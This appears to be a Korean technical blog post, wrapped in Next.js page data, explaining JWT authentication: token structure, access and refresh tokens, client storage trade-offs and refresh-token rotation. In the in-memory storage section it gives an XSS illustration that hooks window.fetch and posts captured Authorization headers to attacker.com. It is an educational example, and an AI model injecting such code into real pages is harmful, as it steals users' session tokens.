@@ -1,0 +1,401 @@
+1:"$Sreact.fragment"
+2:"$Sreact.suspense"
+3:I[31308,["/_next/static/chunks/0~3g-amqkk3jc.js","/_next/static/chunks/0e7u158t7_0c5.js","/_next/static/chunks/0bwq3.6~do~0k.js"],"TagPageClient"]
+8:I[90774,["/_next/static/chunks/0~3g-amqkk3jc.js","/_next/static/chunks/0e7u158t7_0c5.js"],"OutletBoundary"]
+4:T8572,
+## 들어가며
+
+세션 기반 인증은 서버가 사용자의 로그인 상태를 직접 저장하고 관리하는 방식이다. 사용자가 로그인하면 서버는 세션 저장소에 사용자 정보를 저장하고, 클라이언트는 그 세션을 식별할 수 있는 `session_id`만 가지고 요청을 보낸다. 이 방식은 구조가 직관적이고 서버가 인증 상태를 직접 제어할 수 있다는 장점이 있지만, 서버가 상태를 가지고 있어야 하기 때문에 확장성 측면에서 고민이 필요하다. 이러한 세션 기반 인증의 특징과 반대되는 방식으로 자주 등장하는 것이 JWT(JSON Web Token) 기반 인증이다.
+
+JWT 기반 인증은 서버가 로그인 상태를 직접 저장하지 않는다. 대신 서버는 로그인에 성공한 사용자에게 토큰을 발급하고, 클라이언트는 이후 요청마다 이 토큰을 함께 보낸다. 서버는 요청에 포함된 토큰을 검증하여 사용자를 식별한다. 즉, 세션 기반 인증이 서버가 로그인 상태를 기억하는 방식이라면, JWT 기반 인증은 클라이언트가 토큰을 통해 자신을 증명하는 방식이라고 볼 수 있다. 이번 글에서는 JWT 기반 인증의 개념과 동작 방식, Access Token과 Refresh Token 전략, 토큰에 포함해야 하는 정보, 저장 위치, 그리고 Refresh Token을 어떻게 설계해야 하는지까지 함께 정리해보겠다.
+
+## 1. 개요
+
+### 1.1. JWT란 무엇인가
+
+JWT는 JSON Web Token의 약자로, JSON 형태의 정보를 문자열로 표현한 토큰이다. 겉으로 보면 긴 문자열 하나처럼 보이지만, 내부적으로는 일정한 구조를 가지고 있다. JWT는 보통 다음과 같은 형태로 구성된다.
+
+```text
+header.payload.signature
+```
+
+각 부분은 점(`.`)으로 구분된다.
+
+`header`에는 이 토큰이 어떤 알고리즘으로 서명되었는지와 토큰 타입이 담긴다. `payload`에는 실제로 전달하고 싶은 데이터가 담긴다. 예를 들어 사용자 ID, 권한, 만료 시간 같은 정보가 여기에 포함될 수 있다. 마지막으로 `signature`는 이 토큰이 서버에 의해 정상적으로 발급되었고, 중간에 변조되지 않았음을 검증하기 위한 서명 값이다.
+
+```mermaid
+flowchart LR
+    JWT[JWT] --> Header[Header<br/>토큰 타입, 서명 알고리즘]
+    JWT --> Payload[Payload<br/>사용자 식별 정보, 권한, 만료 시간]
+    JWT --> Signature[Signature<br/>변조 여부 검증]
+```
+
+여기서 중요한 점은 JWT의 payload가 암호화된 값이 아니라는 것이다. JWT는 Base64Url 방식으로 인코딩되어 있을 뿐이기 때문에, 누구든지 토큰을 디코딩하면 payload의 내용을 확인할 수 있다. 따라서 JWT 안에는 민감한 정보를 넣으면 안 된다. 비밀번호, 전화번호, 주소, 결제 정보처럼 노출되면 문제가 되는 데이터는 절대 포함해서는 안 된다. JWT는 숨겨진 정보가 아니라 변조 여부를 검증할 수 있는 정보에 가깝다. 서버는 서명을 통해 이 토큰이 자신이 발급한 것인지, 중간에 값이 바뀌지 않았는지를 확인할 수 있다.
+
+### 1.2. 세션 기반 인증과 JWT 기반 인증의 차이
+
+세션 기반 인증과 JWT 기반 인증의 가장 큰 차이는 "로그인 상태를 어디에서 관리하느냐"이다. 세션 기반 인증에서는 서버가 사용자의 로그인 상태를 저장한다. 사용자가 로그인하면 서버는 세션 저장소에 사용자 정보를 저장하고, 클라이언트에게는 `session_id`만 전달한다. 이후 요청이 들어오면 서버는 `session_id`를 이용해 세션 저장소를 조회하고 사용자를 식별한다.
+
+반면, JWT 기반 인증에서는 서버가 로그인 상태를 저장하지 않는다. 로그인에 성공하면 서버는 사용자 정보를 담은 JWT를 발급하고, 클라이언트는 이 토큰을 저장한다. 이후 요청마다 클라이언트가 토큰을 함께 보내면, 서버는 토큰의 서명을 검증하고 payload의 정보를 읽어 사용자를 식별한다.
+
+```mermaid
+flowchart TB
+    subgraph SessionAuth[세션 기반 인증]
+        C1[클라이언트<br/>session_id 보관] --> S1[서버]
+        S1 --> Store1[세션 저장소<br/>사용자 상태 저장]
+    end
+
+    subgraph JWTAuth[JWT 기반 인증]
+        C2[클라이언트<br/>JWT 보관] --> S2[서버]
+        S2 --> Verify[토큰 서명 검증<br/>payload에서 사용자 정보 추출]
+    end
+```
+
+이 차이 때문에 세션 기반 인증은 서버가 인증 상태를 강하게 제어하기 쉽다. 로그아웃이 필요하면 서버에서 세션을 삭제하면 된다. 반면, JWT 기반 인증은 서버가 상태를 저장하지 않기 때문에 확장성이 좋지만, 이미 발급된 토큰을 즉시 무효화하기 어렵다는 특징이 있다. 즉, 세션은 서버가 기억하는 방식이고, JWT는 클라이언트가 증명하는 방식이다.
+
+## 2. JWT 기반 인증의 동작 방식
+
+JWT 기반 인증의 흐름은 로그인 과정에서 시작된다. 사용자가 아이디와 비밀번호를 입력해 로그인 요청을 보내면, 서버는 먼저 사용자의 정보를 검증한다. 이 과정은 세션 기반 인증과 크게 다르지 않다. 서버는 데이터베이스에서 사용자를 조회하고, 비밀번호가 일치하는지 확인한다. 인증에 성공하면 서버는 JWT를 생성한다. 이 토큰 안에는 보통 사용자를 식별할 수 있는 값과 토큰 만료 시간이 포함된다. 서버는 이 토큰에 서명한 뒤 클라이언트에게 전달한다. 클라이언트는 전달받은 토큰을 저장해두고, 이후 인증이 필요한 API를 호출할 때마다 이 토큰을 함께 보낸다. 일반적으로는 `Authorization` 헤더에 `Bearer` 형식으로 담아 보낸다.
+
+```http
+Authorization: Bearer <access_token>
+```
+
+서버는 요청을 받을 때마다 토큰을 검증한다. 서명이 올바른지 확인하고, 토큰이 만료되지 않았는지 검사한 뒤, payload에 담긴 사용자 정보를 꺼낸다. 이 과정을 통해 서버는 별도의 세션 저장소를 조회하지 않고도 요청을 보낸 사용자를 식별할 수 있다.
+
+```mermaid
+sequenceDiagram
+    participant Client as 클라이언트
+    participant Server as 서버
+    participant DB as 데이터베이스
+
+    Client->>Server: 로그인 요청<br/>(아이디, 비밀번호)
+    Server->>DB: 사용자 조회 및 비밀번호 검증
+    DB-->>Server: 사용자 정보 반환
+    Server->>Server: JWT 생성 및 서명
+    Server-->>Client: Access Token 발급
+
+    Client->>Server: API 요청<br/>Authorization: Bearer Access Token
+    Server->>Server: 토큰 서명 검증
+    Server->>Server: 만료 시간 확인
+    Server->>Server: payload에서 사용자 정보 추출
+    Server-->>Client: 응답
+```
+
+이 구조에서 핵심은 서버가 로그인 상태를 저장하지 않는다는 점이다. 서버는 요청이 들어올 때마다 토큰을 검증할 뿐이다. 따라서 서버가 여러 대로 늘어나더라도, 각 서버가 동일한 비밀키 또는 공개키를 가지고 있다면 동일하게 토큰을 검증할 수 있다.
+
+## 3. Access Token
+
+Access Token은 JWT의 특정한 종류를 의미하는 것이 아니라, 토큰이 수행하는 역할을 기준으로 붙인 이름이다. 즉, Access Token이라는 이름은 어떤 고정된 형식이나 표준이 있는 것이 아니라, "API 요청에 사용되는 토큰"이라는 의미를 표현하기 위한 관례적인 용어이다. 이론적으로는 Access Token이라는 이름 대신 다른 이름을 사용해도 동작에는 아무런 문제가 없다. 이를테면, First Token, Main Token과 같은 이름을 붙여도 시스템은 동일하게 동작한다.
+
+다만, 실무에서는 Access Token과 Refresh Token이라는 용어가 널리 사용되고 있기 때문에, 이 이름을 사용하는 것이 개발자 간의 의사소통 측면에서 훨씬 명확하다. 결국 중요한 것은 이름 자체가 아니라, 각 토큰이 어떤 역할을 하고 어떤 방식으로 사용되는지에 대한 설계이다.
+
+### 3.1. Access Token의 역할
+
+JWT 기반 인증에서 가장 기본이 되는 토큰은 Access Token이다. Access Token은 실제 API 요청에 사용되는 토큰이다. 사용자가 로그인한 뒤 게시글 작성, 마이페이지 조회, 주문 생성 같은 요청을 보낼 때 서버는 Access Token을 확인하여 사용자를 식별한다. Access Token은 말 그대로 '접근 권한을 증명하는 토큰'이다. 서버는 이 토큰을 보고 '이 사용자는 인증된 사용자다', '이 사용자는 USER 권한을 가지고 있다'와 같은 판단을 할 수 있다.
+
+하지만 Access Token은 매 요청마다 서버로 전달되기 때문에, 탈취될 경우 위험하다. 공격자가 Access Token을 얻으면 만료되기 전까지 해당 사용자처럼 API를 호출할 수 있다. 그래서 Access Token은 일반적으로 만료 시간을 짧게 설정한다. 예를 들어 10분, 15분, 30분 정도로 설정하는 경우가 많다. 이렇게 하면 토큰이 탈취되더라도 사용할 수 있는 시간이 제한되기 떄문이다. 다만 만료 시간을 너무 짧게 설정하면 사용자가 자주 로그아웃되거나, 토큰 만료로 인해 요청이 자주 실패할 수 있다. 즉, Access Token 하나만 사용하는 방식은 단순하지만 사용자 경험과 보안 사이에서 균형을 잡기 어렵다는 한계가 있다.
+
+### 3.2. Access Token에 포함되어야 하는 정보
+
+Access Token에는 요청을 처리하는 데 필요한 최소한의 정보만 포함하는 것이 좋다. 일반적으로는 사용자를 식별하기 위한 `user_id` 또는 `sub`, 권한을 나타내는 `role`, 토큰 만료 시간인 `exp`, 토큰 발급 시간인 `iat` 정도가 포함된다. 예를 들면 다음과 같은 payload를 생각할 수 있다.
+
+```json
+{
+  "sub": "1",
+  "role": "USER",
+  "iat": 1710000000,
+  "exp": 1710000900
+}
+```
+
+여기서 `sub`는 subject의 약자로, 토큰의 주체를 의미한다. 보통 사용자 ID를 넣는다. `role`은 사용자의 권한을 판단하기 위한 값이다. `iat`는 토큰이 발급된 시간이고, `exp`는 토큰이 만료되는 시간이다. 이 정도 정보만으로도 서버는 대부분의 인증 처리를 수행할 수 있다. 요청을 보낸 사용자가 누구인지 알 수 있고, 어떤 권한을 가지고 있는지도 판단할 수 있기 때문이다.
+
+Access Token에 너무 많은 정보를 담는 것은 좋지 않다. JWT는 암호화된 것이 아니기 때문에 디코딩하면 내부 내용을 확인할 수 있다. 따라서 이메일, 전화번호, 주소, 생년월일, 결제 정보, 비밀번호 같은 민감한 정보는 절대 넣으면 안 된다. 또한 토큰 크기가 커지는 것도 문제다. Access Token은 거의 모든 API 요청마다 전송되기 때문에, 불필요한 정보가 많아지면 네트워크 비용이 증가하고 요청 크기도 커진다. 결국 Access Token에 정보를 넣을 때의 기준은 단순하다.
+
+> "서버가 사용자를 식별하고 권한을 판단하는 데 필요한 최소한의 정보만 넣는다"
+
+### 3.3. Access Token에 포함하면 안 되는 정보
+
+앞서 언급했듯이 Access Token에는 노출되면 문제가 되는 정보를 넣으면 안 된다. 가장 대표적으로 비밀번호는 절대 포함해서는 안 된다. 해시된 비밀번호라 하더라도 토큰에 넣을 이유가 없다. 이메일이나 전화번호도 서비스에 따라 개인정보에 해당할 수 있기 때문에 가급적 넣지 않는 것이 좋다. 주소, 주민등록번호, 결제 정보, 계좌 정보 같은 민감 정보는 당연히 넣으면 안 된다. JWT는 누구나 디코딩할 수 있기 때문에, 이런 정보가 들어가면 토큰이 노출되는 순간 개인정보 유출로 이어질 수 있다. 또한 사용자 프로필 전체나 권한 목록 전체처럼 큰 데이터도 넣지 않는 것이 좋다. 토큰은 요청마다 전송되기 때문에 크기가 커질수록 성능에 영향을 줄 수 있다.
+
+예를 들어 다음과 같은 payload는 좋지 않다.
+
+```json
+{
+  "user_id": 1,
+  "email": "user@example.com",
+  "phone": "010-1234-5678",
+  "address": "Seoul...",
+  "password": "hashed-password",
+  "role": "USER"
+}
+```
+
+이런 정보들은 필요할 때 서버에서 DB를 조회해서 가져오는 것이 더 안전하다.
+
+## 4. Access Token 저장 위치
+
+JWT 기반 인증을 실제로 구현할 때 가장 많이 고민하는 부분 중 하나가 Access Token을 어디에 저장할 것인가이다. 클라이언트는 서버로부터 받은 토큰을 어딘가에 저장해야 한다. 그래야 이후 요청에서 토큰을 꺼내 서버에 보낼 수 있다. 대표적인 저장 위치로는 `localStorage`, 메모리, 그리고 `HttpOnly Cookie`가 있다.
+
+### 4.1. localStorage에 저장하는 방식
+
+가장 단순한 방식은 Access Token을 localStorage에 저장하는 것이다. 이 방식은 구현이 쉽다. 프론트엔드 코드에서 토큰을 쉽게 꺼낼 수 있고, API 요청을 보낼 때 Authorization 헤더에 붙이기도 편하다. 예를 들어 다음과 같이 사용할 수 있다.
+
+```ts
+const token = localStorage.getItem('accessToken');
+
+fetch('/api/me', {
+  headers: {
+    Authorization: `Bearer ${token}`,
+  },
+});
+```
+
+하지만 localStorage는 JavaScript에서 접근할 수 있기 때문에 XSS(Cross-Site Scripting) 공격에 취약하다. 만약 공격자가 악성 스크립트를 실행할 수 있다면, localStorage에 저장된 Access Token을 읽어갈 수 있다. 토큰이 탈취되면 공격자는 해당 토큰이 만료될 때까지 사용자처럼 요청을 보낼 수 있다. 그래서 보안이 중요한 서비스에서는 localStorage에 토큰을 저장하는 방식을 신중하게 선택해야 한다.
+
+### 4.2. 메모리에 저장하는 방식
+
+Access Token을 브라우저 메모리에만 저장하는 방식도 있다. 이 방식은 페이지가 살아 있는 동안 변수, React state, 전역 상태 관리 도구 같은 곳에 토큰을 보관한다. localStorage나 sessionStorage처럼 브라우저 저장소에 영구적으로 남지 않기 때문에, 새로고침하거나 탭을 닫으면 토큰이 사라진다. 이 점은 보안 측면에서 장점이 될 수 있다. 공격자가 나중에 브라우저 저장소를 확인하더라도 Access Token이 남아 있지 않기 때문이다. 또한 토큰이 유지되는 시간이 짧아지므로, 탈취될 수 있는 기간도 줄어든다.
+
+하지만 메모리에 저장한다고 해서 XSS 공격으로부터 완전히 안전해지는 것은 아니다. 악성 스크립트가 실행되는 순간 Access Token이 메모리에 존재한다면, 그 스크립트가 토큰에 접근하거나 인증된 API 요청을 대신 보낼 수 있다. 즉, 메모리 저장은 토큰의 노출 범위를 줄여줄 뿐, XSS 자체를 막아주는 해결책은 아니다.
+
+전역 상태나 변수에 접근 가능한 경우:
+
+```ts
+const token = window.accessToken;
+
+console.log(token); // [!code highlight]
+```
+
+또는, API 요청을 가로채서 Authorization 헤더를 확인:
+
+```ts
+const originalFetch = window.fetch;
+
+window.fetch = async (...args) => {
+  const [url, options] = args;
+
+  if (!options || !options.headers) {
+    return originalFetch(...args);
+  }
+
+  const headers = options.headers;
+  const authHeader = headers.Authorization || headers.authorization || (headers.get && headers.get('Authorization'));
+
+  if (authHeader) {
+    console.log(authHeader); // [!code highlight]
+
+    originalFetch('https://attacker.com/steal', {
+      method: 'POST',
+      body: JSON.stringify({ token: authHeader }),
+    });
+  }
+
+  return originalFetch(...args);
+};
+```
+
+또한 사용자 경험 측면의 불편함도 있다. 새로고침하거나 탭을 닫으면 Access Token이 사라지기 때문에, 사용자가 로그인 상태를 유지하려면 Refresh Token을 이용해 Access Token을 다시 발급받는 구조가 필요하다. 이때 Refresh Token은 보통 HttpOnly Cookie처럼 JavaScript에서 직접 접근할 수 없는 더 안전한 위치에 저장하는 방식을 함께 사용한다. 결국 메모리 저장 방식은 Access Token을 오래 남기지 않는다는 점에서 localStorage보다 안전한 선택이 될 수 있지만, XSS에 대한 완전한 방어책은 아니다. 따라서 CSP(Content Security Policy) 설정, 입력값 검증, 위험한 HTML 삽입 방지 등 XSS 자체를 줄이기 위한 보안 조치가 함께 필요하다.
+
+### 4.3. HttpOnly Cookie에 저장하는 방식
+
+또 다른 방식은 Access Token을 쿠키에 저장하되, `HttpOnly` 옵션을 설정하는 것이다. `HttpOnly` 쿠키는 JavaScript에서 접근할 수 없다. 따라서 XSS 공격이 발생하더라도 스크립트가 쿠키 값을 직접 읽어갈 수 없다. 이 점에서 localStorage보다 안전한 선택이 될 수 있다.
+
+```http
+Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax
+```
+
+다만 쿠키는 브라우저가 요청에 자동으로 포함한다. 이 특성 때문에 CSRF(Cross-Site Request Forgery) 공격을 고려해야 한다. 공격자가 다른 사이트에서 사용자의 브라우저를 이용해 요청을 보내면, 쿠키가 자동으로 포함될 수 있기 때문이다. 이를 완화하기 위해 `SameSite` 옵션을 설정하거나 CSRF 토큰을 함께 사용하는 방법이 있다. 또한 HTTPS 환경에서만 쿠키가 전송되도록 `Secure` 옵션을 사용하는 것이 좋다.
+
+정리하면 localStorage는 사용하기 쉽지만 XSS에 취약하고, HttpOnly Cookie는 XSS에 더 강하지만 CSRF 대응이 필요하다. 메모리 저장은 노출 위험을 줄일 수 있지만 새로고침 시 토큰이 사라지는 문제가 있다. 따라서 저장 위치는 "무조건 이것이 정답"이라고 말하기 어렵다. 서비스의 보안 요구사항, 클라이언트 구조, 사용자 경험을 함께 고려해야 한다.
+
+---
+
+## 5. JWT 기반 인증 방식의 종류
+
+JWT 기반 인증은 하나의 방식으로만 사용되지 않는다. 실무에서는 크게 Access Token만 사용하는 방식과 Access Token + Refresh Token을 함께 사용하는 방식으로 나누어 볼 수 있다.
+
+### 5.1. Access Token만 사용하는 방식
+
+가장 단순한 구조는 Access Token 하나만 사용하는 방식이다. 사용자가 로그인하면 서버는 Access Token을 발급한다. 클라이언트는 이 토큰을 저장해두고, 이후 모든 요청에 이 토큰을 포함해서 보낸다. 서버는 매 요청마다 토큰을 검증하고 사용자를 식별한다.
+
+```mermaid
+sequenceDiagram
+    participant Client as 클라이언트
+    participant Server as 서버
+
+    Client->>Server: 로그인 요청
+    Server-->>Client: Access Token 발급
+
+    Client->>Server: API 요청<br/>Access Token 포함
+    Server->>Server: Access Token 검증
+    Server-->>Client: 응답
+
+    Note over Client,Server: Access Token 만료 전까지 계속 사용
+```
+
+이 방식은 구현이 단순하다. 서버는 별도의 상태를 저장하지 않고, 클라이언트는 하나의 토큰만 관리하면 된다. 하지만 단점도 명확하다. Access Token이 탈취되면 만료되기 전까지는 계속 사용할 수 있다. 이를 막기 위해 만료 시간을 짧게 설정하면, 사용자는 자주 다시 로그인해야 하는 불편함을 겪을 수 있다. 즉, Access Token만 사용하는 방식은 단순하지만 보안성과 사용자 경험을 동시에 만족시키기 어렵다.
+
+### 5.2. Access Token + Refresh Token 방식
+
+Access Token만 사용하는 방식의 한계를 보완하기 위해 많이 사용하는 전략이 Access Token과 Refresh Token을 함께 사용하는 방식이다. 이 방식에서는 두 개의 토큰이 서로 다른 역할을 가진다. Access Token은 실제 API 요청에 사용된다. 따라서 탈취되었을 때의 피해를 줄이기 위해 짧은 만료 시간을 가진다. Refresh Token은 Access Token이 만료되었을 때 새로운 Access Token을 발급받기 위해 사용된다. 사용자가 매번 다시 로그인하지 않아도 되도록 로그인 상태를 연장하는 역할을 한다.
+
+```mermaid
+sequenceDiagram
+    participant Client as 클라이언트
+    participant Server as 서버
+    participant Store as Refresh Token 저장소
+
+    Client->>Server: 로그인 요청
+    Server->>Server: Access Token 생성
+    Server->>Store: Refresh Token 저장
+    Server-->>Client: Access Token + Refresh Token 발급
+
+    Client->>Server: API 요청<br/>Access Token 포함
+    Server->>Server: Access Token 검증
+    Server-->>Client: 응답
+
+    Client->>Server: Access Token 만료 후 재발급 요청<br/>Refresh Token 포함
+    Server->>Store: Refresh Token 조회 및 검증
+    Store-->>Server: 유효한 토큰
+    Server-->>Client: 새로운 Access Token 발급
+```
+
+이 구조에서는 Access Token이 짧게 유지되기 때문에 탈취 피해를 줄일 수 있다. 동시에 Refresh Token을 통해 사용자는 계속 로그인 상태를 유지할 수 있다. 하지만 Refresh Token은 Access Token보다 더 오래 유효하기 때문에 더 신중하게 관리해야 한다. Refresh Token이 탈취되면 공격자가 계속 새로운 Access Token을 발급받을 수 있기 때문이다.
+
+## 6. Refresh Token 설계
+
+Refresh Token은 Access Token을 다시 발급받기 위한 토큰이다. 그래서 Access Token보다 더 긴 수명을 가지는 경우가 많다.
+
+> Access Token과 마찬가지로, Refresh Token 역시 특정 형식을 의미하는 것이 아니라, Access Token을 재발급하기 위한 용도로 사용되는 토큰이라는 역할을 나타내는 이름일 뿐이다.
+
+그만큼 Refresh Token은 더 위험한 토큰이기도 하다. Access Token은 만료 시간이 짧기 때문에 탈취되더라도 피해 시간이 제한되지만, Refresh Token은 장기간 유효할 수 있기 때문이다.
+
+### 6.1. JWT 기반 Refresh Token
+
+Refresh Token도 JWT로 만들 수 있다. Access Token과 동일하게 payload를 담고 서명해서 발급하면 된다. 이 방식은 구현이 단순하다. Access Token과 Refresh Token을 같은 방식으로 생성하고 검증할 수 있기 때문이다. Refresh Token 안에 사용자 ID와 만료 시간을 넣고, 서버는 서명을 검증하면 된다. 하지만 Refresh Token을 JWT로 만들면 단점도 있다. JWT는 기본적으로 서버가 상태를 저장하지 않는 구조이기 때문에, 이미 발급된 Refresh Token을 즉시 무효화하기 어렵다.
+
+예를 들어 사용자가 로그아웃했거나, 토큰이 탈취되었다고 의심되는 상황을 생각해보자. 서버가 Refresh Token을 따로 저장하고 있지 않다면, 해당 토큰이 만료되기 전까지는 계속 유효할 수 있다. 그래서 Refresh Token을 JWT로 만들더라도, 실무에서는 서버에 토큰 식별자나 토큰 상태를 저장해두는 방식을 함께 사용하기도 한다. 이 경우 완전한 stateless 구조는 아니지만, 보안적으로 더 안전해진다.
+
+### 6.2. 랜덤 문자열 기반 Refresh Token
+
+Refresh Token은 꼭 JWT일 필요는 없다. 오히려 실무에서는 랜덤한 문자열, 즉 opaque token 형태로 만드는 경우도 많다. Opaque token은 토큰 자체에 의미 있는 정보를 담지 않는다. 단순히 예측 불가능한 긴 랜덤 문자열이다. 서버는 이 값을 DB나 Redis에 저장해두고, 클라이언트가 Refresh Token을 보내면 저장소에서 조회하여 유효성을 판단한다.
+
+```mermaid
+flowchart LR
+    Client[클라이언트<br/>Refresh Token 보관] --> Server[서버]
+    Server --> Store[(DB 또는 Redis)]
+    Store --> Data[토큰 소유자, 만료 시간, 폐기 여부]
+```
+
+이 방식의 장점은 서버가 Refresh Token을 직접 통제할 수 있다는 점이다. 로그아웃하면 저장소에서 해당 Refresh Token을 삭제하면 된다. 토큰이 탈취되었다고 판단되면 특정 토큰만 폐기할 수도 있다. 또한 사용자의 기기별로 Refresh Token을 따로 관리할 수도 있다. 예를 들어 사용자가 노트북과 휴대폰에서 각각 로그인했다면, 각 기기에 서로 다른 Refresh Token을 발급하고 저장소에서 따로 관리할 수 있다. 그러면 특정 기기만 로그아웃시키는 것도 가능하다. 즉, Refresh Token은 장기적으로 인증 상태를 유지하는 핵심 수단이기 때문에, 서버가 통제할 수 있는 형태로 설계하는 것이 안전하다.
+
+### 6.3. Refresh Token Rotation
+
+보안을 강화하기 위해 Refresh Token Rotation 전략을 사용할 수 있다. Refresh Token Rotation은 Refresh Token을 사용할 때마다 새로운 Refresh Token을 발급하고, 기존 Refresh Token은 폐기하는 방식이다. 이 전략을 이해하려면 먼저 중요한 전제가 있다. 서버는 Refresh Token을 완전히 모르는 상태로 두지 않고, 보통 DB나 Redis 같은 저장소에 Refresh Token 정보를 저장해둔다.
+
+Access Token은 매 요청마다 검증만 하면 되기 때문에 서버에 저장하지 않는 경우가 많다. 반면 Refresh Token은 Access Token을 다시 발급받기 위한 장기 토큰이기 때문에, 서버가 직접 관리할 수 있어야 한다. 예를 들어 서버는 Refresh Token 자체를 그대로 저장하기보다는, 보안상 해시해서 저장하는 경우가 많다.
+
+```text
+refresh_tokens 테이블
+
+id: 1
+user_id: 10
+token_hash: abcdef123456...
+expires_at: 2026-05-01
+revoked_at: null
+created_at: 2026-04-25
+```
+
+이렇게 저장해두면 클라이언트가 Refresh Token을 보내왔을 때, 서버는 전달받은 토큰을 같은 방식으로 해시한 뒤 저장소에 있는 `token_hash`와 비교한다. 즉, 서버가 저장하는 것은 보통 Refresh Token 원문이 아니라 Refresh Token을 검증할 수 있는 값이다. 이렇게 하면 저장소가 유출되더라도 Refresh Token 원문이 바로 노출되는 위험을 줄일 수 있다.
+
+Refresh Token Rotation의 흐름은 다음과 같다.
+
+```mermaid
+sequenceDiagram
+    participant Client as 클라이언트
+    participant Server as 서버
+    participant Store as Refresh Token 저장소
+
+    Client->>Server: 재발급 요청<br/>Refresh Token A
+    Server->>Server: Refresh Token A 해시 생성
+    Server->>Store: token_hash 조회
+    Store-->>Server: 유효한 Refresh Token 정보 반환
+
+    Server->>Store: Refresh Token A 폐기 처리
+    Server->>Server: Refresh Token B 생성
+    Server->>Store: Refresh Token B 해시 저장
+
+    Server-->>Client: 새로운 Access Token + Refresh Token B 발급
+```
+
+여기서 기존 Refresh Token을 폐기한다는 것은 저장소에서 삭제하거나, `revoked_at` 값을 기록해서 더 이상 사용할 수 없도록 표시하는 것을 의미한다. 단순히 삭제할 수도 있지만, 실무에서는 재사용 탐지를 위해 기록을 남겨두는 경우도 많다. 예를 들어 이미 폐기된 Refresh Token이 다시 들어오면, 서버는 이를 단순한 만료가 아니라 탈취된 토큰이 재사용된 상황으로 판단할 수 있다.
+
+예를 들어 공격자가 Refresh Token A를 탈취했다고 가정해보자. 정상 사용자가 먼저 Refresh Token A로 재발급 요청을 보내면, 서버는 Refresh Token A를 폐기하고 Refresh Token B를 새로 발급한다. 이후 공격자가 훔친 Refresh Token A를 사용하려고 하면, 서버는 저장소에서 이 토큰이 이미 폐기된 토큰이라는 사실을 확인할 수 있다. 이 경우 서버는 Refresh Token 재사용 공격으로 판단하고, 해당 사용자의 모든 Refresh Token을 폐기하거나 강제 로그아웃 처리할 수 있다.
+
+```mermaid
+sequenceDiagram
+    participant User as 정상 사용자
+    participant Attacker as 공격자
+    participant Server as 서버
+    participant Store as Refresh Token 저장소
+
+    User->>Server: Refresh Token A로 재발급 요청
+    Server->>Store: A 유효성 확인
+    Store-->>Server: A 유효함
+    Server->>Store: A 폐기, B 저장
+    Server-->>User: Access Token + Refresh Token B 발급
+
+    Attacker->>Server: 탈취한 Refresh Token A 사용
+    Server->>Store: A 상태 확인
+    Store-->>Server: 이미 폐기된 토큰
+    Server->>Store: 사용자의 모든 Refresh Token 폐기
+    Server-->>Attacker: 재발급 거부
+```
+
+정리하면 Refresh Token Rotation은 단순히 토큰을 새로 발급하는 방식이 아니다. 핵심은 서버가 Refresh Token의 상태를 저장하고, 이전 토큰이 다시 사용되는지를 추적한다는 점이다. 따라서 이 전략을 사용하려면 서버에는 보통 다음과 같은 정보가 필요하다.
+
+```text
+user_id
+token_hash
+expires_at
+revoked_at
+replaced_by_token_id
+created_at
+```
+
+`user_id`는 이 Refresh Token이 어떤 사용자에게 발급된 것인지 나타낸다. `token_hash`는 실제 토큰을 검증하기 위한 값이다. `expires_at`은 토큰 만료 시간이고, `revoked_at`은 토큰이 폐기된 시간을 의미한다. `replaced_by_token_id`는 이 토큰이 어떤 새 토큰으로 교체되었는지를 추적하는 데 사용할 수 있다.
+
+결국 Refresh Token Rotation은 JWT 기반 인증에서 부족한 서버의 통제력을 보완하기 위한 전략이다. Access Token은 짧게 유지하고, Refresh Token은 서버 저장소에서 상태를 관리함으로써 보안성과 사용자 경험 사이의 균형을 맞추는 방식이라고 볼 수 있다.
+
+## 7. JWT 기반 인증의 특징
+
+JWT 기반 인증의 가장 큰 특징은 서버가 사용자 로그인 상태를 직접 저장하지 않는다는 점이다. 서버는 토큰의 서명을 검증하고, 만료 시간을 확인하고, payload에서 사용자 정보를 꺼내면 된다. 이 구조 덕분에 별도의 세션 저장소가 없어도 인증을 처리할 수 있다. 이 특징은 확장성 측면에서 큰 장점이 된다. 서버가 여러 대로 늘어나더라도 각 서버가 동일한 방식으로 토큰을 검증할 수 있기 때문이다. 세션 기반 인증처럼 특정 서버에 세션이 저장되어 있거나, Redis 같은 중앙 세션 저장소를 반드시 사용해야 하는 구조가 아니다.
+
+하지만 서버가 상태를 저장하지 않는다는 점은 동시에 단점이 된다. 서버는 이미 발급된 Access Token을 기본적으로 추적하지 않는다. 따라서 사용자가 로그아웃했더라도 Access Token 자체가 만료되기 전까지는 유효할 수 있다. 이 문제를 완화하기 위해 Access Token의 만료 시간을 짧게 설정하고, Refresh Token을 서버에서 관리하는 전략을 함께 사용한다. 또는 정말 즉시 무효화가 필요하다면 Access Token 블랙리스트를 운영할 수도 있다. 다만 블랙리스트를 운영하면 결국 서버가 토큰 상태를 저장해야 하므로, JWT의 stateless 장점이 일부 줄어든다.
+
+결국 JWT 기반 인증의 핵심은 단순히 '서버에 상태를 저장하지 않는다'가 아니다. 정확히는 짧게 살아 있는 Access Token과 서버가 통제 가능한 Refresh Token을 조합하여, 확장성과 보안 사이에서 균형을 잡는 것이라고 할 수 있다.
+
+## 8. 사용 기준
+
+JWT 기반 인증은 서버가 여러 대로 확장되는 환경에서 특히 잘 맞는다. 서버 간 세션 상태를 공유할 필요가 없기 때문에 수평 확장에 유리하다. 또한 웹뿐만 아니라 모바일 앱, 외부 API, 다른 서버와의 통신처럼 다양한 클라이언트에서 같은 인증 방식을 사용해야 하는 경우에도 적합하다. 반면 서버가 인증 상태를 즉시 제어해야 하는 서비스라면 세션 기반 인증이 더 적합할 수 있다. 예를 들어 관리자 시스템처럼 강제 로그아웃, 즉시 권한 차단, 특정 세션 제거가 중요한 서비스에서는 세션 방식이 더 직관적이다.
+
+물론 JWT 기반 인증에서도 Refresh Token을 서버에서 관리하거나 블랙리스트를 운영하면 어느 정도 제어가 가능하다. 하지만 그렇게 할수록 JWT의 stateless한 장점은 줄어든다. 따라서 JWT 기반 인증을 선택할 때는 다음 질문을 던져보는 것이 좋다.
+
+- 이 서비스는 서버 확장이 중요한가?
+- 여러 클라이언트에서 동일한 인증 방식을 사용해야 하는가?
+- 즉시 로그아웃이나 강제 차단이 반드시 필요한가?
+- 토큰을 안전하게 저장하고 관리할 수 있는 구조가 있는가?
+
+이 질문에 대한 답에 따라 JWT가 적합할 수도 있고, 세션 기반 인증이 더 적합할 수도 있다.
+
+## 마치며
+
